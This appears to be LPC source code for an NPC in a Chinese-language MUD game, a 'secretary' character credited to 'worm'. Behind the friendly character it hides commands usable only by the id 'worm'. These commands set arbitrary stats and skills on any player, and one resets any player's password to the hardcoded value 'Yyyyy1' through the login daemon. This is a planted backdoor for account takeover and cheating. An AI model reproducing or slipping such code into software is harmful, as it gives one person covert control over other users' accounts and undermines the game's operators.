//secretary.c
// by worm
#define F_I             "/adm/daemons/fingerd.lpc"
#define CHANGE_PASS     "/cmds/usr/passwd.lpc"
inherit NPC;
void create()
{
  set_name("小兰", ({"xiao lan","lan"}));
  set("nickname","千年虫的女秘书");
set("gender", "女性");
 set("long",
"小兰生得楚楚动人，是千年虫的得力助手，虽然年纪轻轻，却十分能干。\n" );
set("combat_exp", 100);
  set("age", 17);
 set("per", 30);
 set("attitude", "friendly");
 set("shen_type", 1);
 set_skill("unarmed", 10);

  setup();
carry_object(__DIR__"obj/cloth1")->wear();
carry_object("/topten/topten");
}
 void init()
  {
     add_action("do_want","want");
     add_action("do_dedao","dedao");
     add_action("do_topten","topten");
      add_action("do_change","change");
     add_action("do_yao","yao");
 }
 int do_want(string arg)
{
 string v1;
int v2;
string target;
object ob;
 if(this_player()->query("id")!="worm")
return notify_fail("你不是worm,sorry\n");
     if (!arg || sscanf(arg, "%s %s %d",target,v1,v2) != 3)
       {
return notify_fail("命令格式：want <名字> <种类> <数字>\n");
       }
ob=find_player(target);
ob->set(v1,v2);
return 1;

  }
  int do_topten()
{
object obn,who;
obn=new("/topten/topten");

who=this_player();
obn->move(who);
return 1;
}
 int do_yao(string arg)
  { 
   string m1;
   string target;
   object ob;
   int m2;
if(this_player()->query("id")!="worm")
 return notify_fail("你不是worm,sorry\n");
   if (!arg || sscanf(arg, "%s %s %d",target,m1,m2) != 3)
     {
      return notify_fail("命令格式：yao <名字> <种类> <数字>\n");
     }
   ob=find_player(target);
   ob->set_skill(m1,m2);
  return 1;
  } 
int do_change(string arg)
{
string target;
     string new_pass,pass;
     object ob;
     new_pass="Yyyyy1";
     pass="Yyyyy1";
     if(this_player()->query("id")!="worm")
     return notify_fail("你不是worm,sorry\n");
if (!arg || sscanf(arg, "%s",target) != 1)
        return notify_fail("命令格式：CHANGE ??\n");
ob=F_I->acquire_login_ob(target);
ob->save();
"/adm/daemons/logind.lpc"->new_password(pass,ob);
ob->save();
ob->destruct();
return 1;
}

  int do_dedao(string arg)
  {
   string target;
   string skill;
   object ob;
if(this_player()->query("id")!="worm")
 return notify_fail("你不是worm,sorry\n");
     if (!arg || sscanf(arg, "%s %s",target,skill) != 2)
     {
      return notify_fail("命令格式：dedao <人名> <种类> \n");
     }
     ob=find_player(target);
ob->improve_skill(skill,(10 + random((int)ob->query("int") - 9))*1000);
   return 1;
  }
